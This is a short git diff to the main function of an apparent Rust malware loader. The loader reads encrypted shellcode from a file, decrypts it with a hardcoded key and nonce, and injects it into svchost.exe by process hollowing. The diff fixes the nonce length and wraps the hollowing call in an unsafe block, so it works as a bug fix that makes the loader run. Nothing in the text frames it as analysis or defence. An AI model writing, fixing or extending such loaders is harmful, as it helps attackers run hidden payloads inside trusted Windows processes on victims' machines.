@@ -11,8 +11,8 @@ fn main() {
     // Fetch Encrypted Shellcode
     let shellcode = fs::read("shellcode/payload.bin").expect("Failed to read shellcode");
 
-    let key: [u8; 16] = *b"mysecretkey12345";
-    let nonce: [u8; 16] = *b"random_iv_nonce";
+    let key: [u8; 16] = *b"mysecretkey12345"; 
+    let nonce: [u8; 16] = *b"random_iv_nonce_"; // Fixed length issue
 
     let decrypted_shellcode = encryption::decrypt_shellcode(&shellcode, &key, &nonce);
 
@@ -21,7 +21,10 @@ fn main() {
 
     // Process Hollowing (Inject into a new process)
     let target_process = "C:\\Windows\\System32\\svchost.exe";
-    hollowing::hollow_process(target_process, &decrypted_shellcode);
+
+    unsafe {
+        hollowing::hollow_process(target_process, &decrypted_shellcode);
+    }
     
     exit(0);
 }
